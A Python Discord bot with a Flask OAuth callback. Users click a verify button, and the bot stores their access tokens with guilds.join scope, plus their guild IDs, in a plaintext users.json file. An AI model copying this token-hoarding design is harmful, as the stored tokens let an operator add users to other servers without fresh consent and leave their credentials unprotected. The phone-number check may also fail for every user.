import discord
from discord.ext import commands
from discord import app_commands
import requests
from flask import Flask, request
import threading
import os
import json
from dotenv import load_dotenv

load_dotenv()

TOKEN = os.getenv('BOT_TOKEN')
CLIENT_ID = os.getenv('CLIENT_ID')
CLIENT_SECRET = os.getenv('CLIENT_SECRET')
REDIRECT_URI = os.getenv('REDIRECT_URI')
ADMIN_USER_ID = 800419751880556586

DB_FILE = 'users.json'

def load_users():
    if os.path.exists(DB_FILE):
        try:
            with open(DB_FILE, 'r', encoding='utf-8') as f:
                return json.load(f)
        except: return {}
    return {}

def save_user(user_id, token, guild_id):
    users = load_users()
    u_str = str(user_id)
    if u_str not in users:
        users[u_str] = {"token": token, "guilds": []}
    if guild_id and str(guild_id) not in users[u_str]["guilds"]:
        users[u_str]["guilds"].append(str(guild_id))
    with open(DB_FILE, 'w', encoding='utf-8') as f:
        json.dump(users, f, indent=4)

# --- Bot 設定 ---
class MyBot(commands.Bot):
    def __init__(self):
        intents = discord.Intents.default()
        intents.members = True
        intents.message_content = True
        super().__init__(command_prefix="!", intents=intents)

    async def setup_hook(self):
        await self.tree.sync()
        print("🌸 同期完了！")

bot = MyBot()

class VerifyView(discord.ui.View):
    def __init__(self, guild_id):
        super().__init__(timeout=None)
        # 確実に動くように、URLを手動で構築
        safe_uri = REDIRECT_URI.replace(':', '%3A').replace('/', '%2F')
        # ここで「state」にギルドIDをしっかり入れる
        self.oauth_url = f"https://discord.com/oauth2/authorize?client_id={CLIENT_ID}&response_type=code&redirect_uri={safe_uri}&scope=identify+guilds.join&state={guild_id}"
        self.add_item(discord.ui.Button(label="Verify (認証して参加するっ！)", url=self.oauth_url, style=discord.ButtonStyle.link))

@bot.tree.command(name="setup")
@app_commands.checks.has_permissions(administrator=True)
async def setup(interaction: discord.Interaction):
    embed = discord.Embed(title="🌸 メンバー認証", description="下のボタンで連携してね！", color=0xffb6c1)
    await interaction.response.send_message(embed=embed, view=VerifyView(interaction.guild_id))

# --- Flask サーバー ---
app = Flask(__name__)

@app.route('/callback')
def callback():
    code = request.args.get('code')
    # guild_idが直接来ている場合と、state経由で来ている場合の両方に対応
    guild_id = request.args.get('state') or request.args.get('guild_id')

    if not code:
        return "認証コードが見つかりません。やり直してください。", 400

    # Discordにトークンを要求
    data = {
        'client_id': CLIENT_ID,
        'client_secret': CLIENT_SECRET,
        'grant_type': 'authorization_code',
        'code': code,
        'redirect_uri': REDIRECT_URI
    }
    
    # 🚨 ここでエラーが起きやすいので慎重に処理
    res = requests.post('https://discord.com/api/oauth2/token', data=data)
    
    if res.status_code != 200:
        return f"Discordトークン取得エラー: {res.text}", res.status_code

    token_json = res.json()
    access_token = token_json.get('access_token')

    # ユーザー情報を取得
    u_res = requests.get('https://discord.com/api/users/@me', headers={'Authorization': f'Bearer {access_token}'})
    u_info = u_res.json()

    # 電話番号チェック（テスト中はここを無効にしたい場合はコメントアウトしてください）
    if not u_info.get('phone'):
        return "<h1>⚠️ 電話番号認証が必要です</h1>", 403

    save_user(u_info['id'], access_token, guild_id)

    return "<h1>認証成功！🌸</h1>Discordに戻ってね♪"

def run_flask():
    app.run(host='0.0.0.0', port=int(os.environ.get("PORT", 10000)))

if __name__ == '__main__':
    threading.Thread(target=run_flask, daemon=True).start()
    bot.run(TOKEN)